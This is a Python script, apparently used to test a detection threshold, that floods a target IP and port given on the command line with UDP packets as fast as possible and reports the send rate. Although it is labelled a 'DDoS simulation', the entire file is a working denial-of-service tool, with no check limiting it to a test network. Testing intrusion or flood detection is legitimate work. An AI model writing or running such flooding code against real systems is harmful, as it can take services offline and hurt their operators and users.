import socket
import sys
import time

def simulate_ddos(target_ip, port=80, duration=5, packet_size=1024):
    print(f"Starting DDoS simulation (UDP Flood) against {target_ip}:{port} for {duration} seconds...")
    print("This will send packets as fast as possible to trigger the >1000 packets/sec threshold.")
    
    # Create UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate dummy payload
    payload = b"X" * packet_size
    
    timeout = time.time() + duration
    packets_sent = 0
    start_time = time.time()
    
    try:
        while time.time() < timeout:
            s.sendto(payload, (target_ip, port))
            packets_sent += 1
            
            # Print status every ~10000 packets
            if packets_sent % 10000 == 0:
                elapsed = time.time() - start_time
                rate = packets_sent / elapsed if elapsed > 0 else 0
                print(f"Sent {packets_sent} packets so far... (Current rate: ~{int(rate)} pps)")
                
    except KeyboardInterrupt:
        print("\nSimulation stopped manually.")
    except Exception as e:
        print(f"\nError taking place: {e}")
    finally:
        s.close()
        
    actual_duration = time.time() - start_time
    final_rate = packets_sent / actual_duration if actual_duration > 0 else 0
    
    print("\n--- Simulation Summary ---")
    print(f"Total packets sent: {packets_sent}")
    print(f"Time elapsed: {actual_duration:.2f} seconds")
    print(f"Average send rate: ~{int(final_rate)} packets/second")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python simulate_ddos.py <target_ip> [port] [duration_seconds]")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    
    simulate_ddos(target_ip, port, duration)
